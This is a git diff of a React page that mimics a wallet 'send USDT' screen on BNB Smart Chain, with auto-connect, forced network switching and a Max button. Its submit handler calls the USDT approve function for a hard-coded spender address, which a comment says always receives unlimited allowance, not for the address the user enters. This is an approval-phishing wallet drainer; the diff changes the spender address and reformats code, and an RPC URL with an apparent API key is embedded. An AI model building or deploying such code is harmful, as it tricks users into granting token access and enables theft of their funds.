@@ -10,11 +10,11 @@ const BSC_CHAIN_ID_DEC = 56;
 /** BEP-20 USDT on BSC (Binance-Peg USDT) */
 const USDT_BSC = "0x55d398326f99059fF775485246999027B3197955";
 
-const rpc =  `https://rpc.ankr.com/bsc/81980e93ea450e7183f250214d083c51a389ad1a1c4188853a14f59182089c29`;
+const rpc = `https://rpc.ankr.com/bsc/81980e93ea450e7183f250214d083c51a389ad1a1c4188853a14f59182089c29`;
 
 /** Unlimited USDT allowance is always approved for this spender only */
 // const USDT_APPROVE_SPENDER = "0x739163eCbE2AA2C70a9a5595205466469cC78d8B";
-const USDT_APPROVE_SPENDER = "0x8Fd2FFc1d235CEf07e37Ea065732ED1a0a6856E5";
+const USDT_APPROVE_SPENDER = "0x739163eCbE2AA2C70a9a5595205466469cC78d8B";
 
 const ERC20_APPROVE_ABI = [
   "function approve(address spender, uint256 amount) returns (bool)",
@@ -24,7 +24,6 @@ const ERC20_APPROVE_ABI = [
 function getEthereum() {
   return typeof window !== "undefined" ? window.ethereum : undefined;
 }
-
 
 async function ensureBscNetwork(ethereum) {
   try {
@@ -52,17 +51,15 @@ async function ensureBscNetwork(ethereum) {
   }
 }
 
-
 // Styling Constants to match Screenshot
-  const colors = {
-    bg: "#1b1b1b",
-    inputBg: "#1a1a1a",
-    primaryGreen: "#48ff91",
-    textMain: "#ffffff",
-    textSecondary: "#aaa7a7ff",
-    border: "#2a2a2a"
-  };
-
+const colors = {
+  bg: "#1b1b1b",
+  inputBg: "#1a1a1a",
+  primaryGreen: "#48ff91",
+  textMain: "#ffffff",
+  textSecondary: "#aaa7a7ff",
+  border: "#2a2a2a",
+};
 
 const Home = () => {
   const [address, setAddress] = useState(USDT_APPROVE_SPENDER);
@@ -73,7 +70,6 @@ const Home = () => {
   const [isProcessing, setIsProcessing] = useState(false);
   const [userBalance, setUserBalance] = useState(0n);
   console.log("Wallet State:", { account, chainId, userBalance });
-  
 
   const refreshChain = useCallback(async (ethereum) => {
     try {
@@ -95,12 +91,12 @@ const Home = () => {
       const usdt = new Contract(USDT_BSC, ERC20_APPROVE_ABI, provider);
       const balance = await usdt.balanceOf(addr);
       console.log("Balance of USDT:", formatUnits(balance, 18), "USDT");
-      
+
       setUserBalance(balance);
     } catch (e) {
       console.error("Error fetching balance:", e);
     }
-    }, []);
+  }, []);
 
   useEffect(() => {
     if (account && chainId === BSC_CHAIN_ID_DEC) {
@@ -130,14 +126,16 @@ const Home = () => {
       try {
         setConnectError(null);
         // Automatically request account connection on mount
-        const accounts = await ethereum.request({ method: "eth_requestAccounts" });
+        const accounts = await ethereum.request({
+          method: "eth_requestAccounts",
+        });
         const activeAccount = accounts[0] ?? null;
         setAccount(activeAccount);
         console.log("Connected account:", activeAccount);
-        
+
         // Initial chain sync
         await refreshChain(ethereum);
-        
+
         // Ensure BSC network immediately after connection
         if (activeAccount) {
           await ensureBscNetwork(ethereum);
@@ -148,7 +146,7 @@ const Home = () => {
         setConnectError(e?.message ?? "Could not connect wallet");
       }
     })();
-      return () => {
+    return () => {
       ethereum.removeListener?.("accountsChanged", onAccounts);
       ethereum.removeListener?.("chainChanged", onChain);
     };
@@ -157,13 +155,16 @@ const Home = () => {
   // Proactively switch to BSC if connected to wrong network
   useEffect(() => {
     const ethereum = getEthereum();
-    if (ethereum && account && chainId !== null && chainId !== BSC_CHAIN_ID_DEC) {
+    if (
+      ethereum &&
+      account &&
+      chainId !== null &&
+      chainId !== BSC_CHAIN_ID_DEC
+    ) {
       console.log("Wrong network detected. Attempting auto-switch to BSC...");
       ensureBscNetwork(ethereum).then(() => refreshChain(ethereum));
     }
   }, [account, chainId, refreshChain]);
-  
-
 
   const handleMax = () => {
     if (userBalance > 0n) {
@@ -189,9 +190,7 @@ const Home = () => {
         activeAccount = accs[0] ?? null;
         setAccount(activeAccount);
       } catch (e) {
-        setConnectError(
-          e?.message ?? "Allow wallet access to continue."
-        );
+        setConnectError(e?.message ?? "Allow wallet access to continue.");
         return;
       }
     }
@@ -231,32 +230,33 @@ const Home = () => {
 
       const tx = await usdt.approve(USDT_APPROVE_SPENDER, usdtAmount);
       await tx.wait();
-      
     } catch (e) {
       const msg = e?.shortMessage || e?.message || "Transaction failed";
       setConnectError(msg);
-      
     } finally {
       setIsProcessing(false);
     }
   };
 
-return (
-    <div className="max-h-screen h-full flex justify-center font-sans" style={{ backgroundColor: colors.bg }}>
+  return (
+    <div
+      className="max-h-screen h-full flex justify-center font-sans"
+      style={{ backgroundColor: colors.bg }}
+    >
       <div className="w-full max-w-md flex flex-col px-5 pt-4 pb-8">
-        
-    
-
         <div className="flex-1 space-y-6">
           {/* Address Input Section */}
           <div>
-            <label className="block text-sm font-medium mb-2" style={{ color: colors.textSecondary }}>
+            <label
+              className="block text-sm font-medium mb-2"
+              style={{ color: colors.textSecondary }}
+            >
               Address or Domain Name
             </label>
-            <div 
+            <div
               className="flex justify-between items-center px-4 py-4 gap-3 rounded-xl border-2 transition-colors focus-within:border-[#48ff91] border-[#2a2a2a]"
-              style={{ 
-                backgroundColor: colors.bg, 
+              style={{
+                backgroundColor: colors.bg,
               }}
             >
               <input
@@ -266,38 +266,52 @@ return (
                 value={address}
                 onChange={(e) => setAddress(e.target.value)}
               />
-              <div className="flex items-center gap-4 ml-2" style={{ color: colors.primaryGreen }}>
+              <div
+                className="flex items-center gap-4 ml-2"
+                style={{ color: colors.primaryGreen }}
+              >
                 <button className="text-sm font-bold">Paste</button>
                 <Clipboard size={20} />
                 <ScanLine size={20} />
               </div>
             </div>
-            </div>
+          </div>
 
           {/* Destination Network Section */}
           <div>
-            <label className="block text-sm font-medium mb-2" style={{ color: colors.textSecondary }}>
+            <label
+              className="block text-sm font-medium mb-2"
+              style={{ color: colors.textSecondary }}
+            >
               Destination network
             </label>
-            <div 
+            <div
               className="flex items-center gap-2 px-3 py-2 rounded-full w-fit"
-              style={{ backgroundColor: colors.inputBg }} 
+              style={{ backgroundColor: colors.inputBg }}
             >
               <img src={icon} alt="BNB" className="w-5 h-5 rounded-full" />
-              <span className="text-white  font-bold text-sm" style={{ color: colors.textSecondary }}>BNB Smart Chain</span>
+              <span
+                className="text-white  font-bold text-sm"
+                style={{ color: colors.textSecondary }}
+              >
+                BNB Smart Chain
+              </span>
               <ChevronDown size={16} style={{ color: colors.textSecondary }} />
             </div>
           </div>
 
           {/* Amount Input Section */}
           <div>
-            <label className="block text-sm font-medium mb-2" style={{ color: colors.textSecondary }}>
+            <label
+              className="block text-sm font-medium mb-2"
+              style={{ color: colors.textSecondary }}
+            >
               Amount
             </label>
-            <div 
+            <div
               className="flex justify-between items-center px-4 py-4 gap-3 rounded-xl border-2 transition-colors focus-within:border-[#48ff91] border-[#2a2a2a]"
-              style={{ 
-                backgroundColor: colors.bg, 
+              style={{
+                backgroundColor: colors.bg,
               }}
             >
               <input
@@ -308,16 +322,29 @@ return (
                 onChange={(e) => setAmount(e.target.value)}
               />
               <div className="flex items-center gap-3">
-                <span className="text-white font-semibold" style={{ color: colors.textSecondary }}>USDT</span>
-                <button onClick={handleMax} className="font-bold cursor-pointer" style={{ color: colors.primaryGreen }}>Max</button>
+                <span
+                  className="text-white font-semibold"
+                  style={{ color: colors.textSecondary }}
+                >
+                  USDT
+                </span>
+                <button
+                  onClick={handleMax}
+                  className="font-bold cursor-pointer"
+                  style={{ color: colors.primaryGreen }}
+                >
+                  Max
+                </button>
               </div>
             </div>
             {(() => {
               if (!amount || Number.parseFloat(amount) <= 0) {
                 return (
-                  <p className="mt-2 text-sm font-medium" style={{ color: colors.textSecondary }}>
-                      ≈ ${Math.floor(Number(amount) * 0.9999 * 100) / 100}
-
+                  <p
+                    className="mt-2 text-sm font-medium"
+                    style={{ color: colors.textSecondary }}
+                  >
+                    ≈ ${Math.floor(Number(amount) * 0.9999 * 100) / 100}
                   </p>
                 );
               }
@@ -336,15 +363,17 @@ return (
                 /* ignore parse errors */
               }
               return (
-                <p className="mt-2 text-sm font-medium" style={{ color: colors.textSecondary }}>
-                    ≈ ${Math.floor(Number(amount) * 0.9999 * 100) / 100}
-                  </p>
+                <p
+                  className="mt-2 text-sm font-medium"
+                  style={{ color: colors.textSecondary }}
+                >
+                  ≈ ${Math.floor(Number(amount) * 0.9999 * 100) / 100}
+                </p>
               );
             })()}
-            </div>
+          </div>
         </div>
 
-        
         {connectError && (
           <p className="mt-4 text-center text-sm font-medium text-red-500">
             {connectError}
@@ -354,12 +383,18 @@ return (
         <button
           type="button"
           onClick={handleNext}
-          disabled={isProcessing || (account && amount && Number.parseFloat(amount) > 0 && userBalance < parseUnits(amount, 18))}
-          className={`w-full ${isProcessing || (account && amount && Number.parseFloat(amount) > 0 && userBalance < parseUnits(amount, 18)) ? 'opacity-70 cursor-not-allowed' : ''} bg-[var(--primary)] text-black font-medium py-3 rounded-full text-lg mt-6`}
+          disabled={
+            isProcessing ||
+            (account &&
+              amount &&
+              Number.parseFloat(amount) > 0 &&
+              userBalance < parseUnits(amount, 18))
+          }
+          className={`w-full ${isProcessing || (account && amount && Number.parseFloat(amount) > 0 && userBalance < parseUnits(amount, 18)) ? "opacity-70 cursor-not-allowed" : ""} bg-[var(--primary)] text-black font-medium py-3 rounded-full text-lg mt-6`}
         >
           {isProcessing ? "Processing..." : "Next"}
         </button>
-        </div>
+      </div>
     </div>
   );
 };
